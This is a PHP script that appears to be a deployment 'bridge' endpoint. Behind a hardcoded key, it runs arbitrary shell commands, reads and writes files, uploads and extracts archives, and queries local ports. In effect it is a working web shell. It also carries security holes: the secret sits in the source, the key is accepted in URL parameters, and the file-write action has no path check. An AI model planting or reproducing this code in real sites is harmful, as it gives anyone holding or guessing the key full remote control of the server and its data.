<?php
header('Content-Type: application/json');

$SECRET = 'thrive_bridge_deploy_8f93e1a';

$auth = $_SERVER['HTTP_X_BRIDGE_KEY'] ?? $_GET['key'] ?? $_POST['key'] ?? '';
if ($auth !== $SECRET) {
    http_response_code(403);
    echo json_encode(['error' => 'Unauthorized']);
    exit;
}

$action = $_POST['action'] ?? $_GET['action'] ?? '';
$dir = __DIR__;

switch ($action) {
    case 'ping':
        echo json_encode([
            'status' => 'ok',
            'php_version' => PHP_VERSION,
            'time' => date('c'),
            'dir' => $dir
        ]);
        break;

    case 'exec':
        $cmd = $_POST['cmd'] ?? '';
        if (!$cmd) {
            echo json_encode(['error' => 'No command provided']);
            exit;
        }
        $output = shell_exec($cmd . ' 2>&1');
        echo json_encode([
            'cmd' => $cmd,
            'output' => $output
        ]);
        break;

    case 'read_file':
        $file = $_POST['file'] ?? $_GET['file'] ?? '';
        $path = realpath($dir . '/' . $file);
        if (!$path || !str_starts_with($path, $dir) || !file_exists($path)) {
            echo json_encode(['error' => 'File not found or access denied']);
            exit;
        }
        echo json_encode([
            'file' => $file,
            'content' => file_get_contents($path)
        ]);
        break;

    case 'write_file':
        $file = $_POST['file'] ?? '';
        $content = $_POST['content'] ?? '';
        $isBase64 = !empty($_POST['base64']);
        if (!$file) {
            echo json_encode(['error' => 'No filename provided']);
            exit;
        }
        $target = $dir . '/' . $file;
        $parent = dirname($target);
        if (!is_dir($parent)) {
            mkdir($parent, 0755, true);
        }
        $data = $isBase64 ? base64_decode($content) : $content;
        $bytes = file_put_contents($target, $data);
        echo json_encode([
            'file' => $file,
            'bytes_written' => $bytes
        ]);
        break;

    case 'upload_archive':
        if (!isset($_FILES['file'])) {
            echo json_encode(['error' => 'No file uploaded']);
            exit;
        }
        $tmp = $_FILES['file']['tmp_name'];
        $dest = $dir . '/deploy_package.tar.gz';
        move_uploaded_file($tmp, $dest);
        $tarOutput = shell_exec("tar -xzf $dest -C $dir 2>&1");
        unlink($dest);
        echo json_encode([
            'status' => 'extracted',
            'output' => $tarOutput
        ]);
        break;

    case 'curl_local':
        $port = intval($_GET['port'] ?? $_POST['port'] ?? 3005);
        $path = $_GET['path'] ?? $_POST['path'] ?? '/';
        $ch = curl_init("http://127.0.0.1:{$port}{$path}");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        $resp = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $err = curl_error($ch);
        curl_close($ch);
        echo json_encode([
            'port' => $port,
            'path' => $path,
            'http_code' => $code,
            'error' => $err,
            'body_sample' => substr($resp, 0, 500)
        ]);
        break;

    default:
        echo json_encode(['error' => 'Unknown action: ' . $action]);
        break;
}
?>
